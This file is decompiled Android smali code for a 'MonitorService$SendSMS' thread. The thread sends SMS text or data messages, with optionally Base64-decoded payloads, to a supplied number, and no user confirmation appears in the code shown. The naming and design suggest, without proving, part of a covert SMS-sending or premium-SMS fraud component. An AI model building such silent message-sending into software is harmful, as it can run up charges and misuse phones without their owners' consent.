.class public Lorg/hj201606/lib/sms/MonitorService$SendSMS;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lorg/hj201606/lib/sms/MonitorService;

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;


# direct methods
.method public constructor <init>(Lorg/hj201606/lib/sms/MonitorService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->a:Lorg/hj201606/lib/sms/MonitorService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-object p2, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->b:Ljava/lang/String;

    iput-object p3, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->c:Ljava/lang/String;

    iput-object p4, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->d:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    const/4 v3, 0x0

    const/4 v2, 0x0

    invoke-super {p0}, Ljava/lang/Thread;->run()V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "______________________________send start______________________________"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->a:Lorg/hj201606/lib/sms/MonitorService;

    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4}, Landroid/content/Intent;-><init>()V

    const/high16 v5, 0x8000000

    invoke-static {v1, v3, v4, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->d:Ljava/lang/String;

    const-string v4, "sendDataMessage"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->c:Ljava/lang/String;

    invoke-static {v1, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v4

    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->b:Ljava/lang/String;

    move-object v6, v2

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    :goto_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "______________________________send ok______________________________"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->d:Ljava/lang/String;

    const-string v4, "sendByteMessage"

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->b:Ljava/lang/String;

    iget-object v4, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->c:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    move-object v6, v2

    invoke-virtual/range {v0 .. v6}, Landroid/telephony/SmsManager;->sendDataMessage(Ljava/lang/String;Ljava/lang/String;S[BLandroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0

    :cond_1
    iget-object v7, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->b:Ljava/lang/String;

    iget-object v9, p0, Lorg/hj201606/lib/sms/MonitorService$SendSMS;->c:Ljava/lang/String;

    move-object v6, v0

    move-object v8, v2

    move-object v10, v5

    move-object v11, v2

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0
.end method
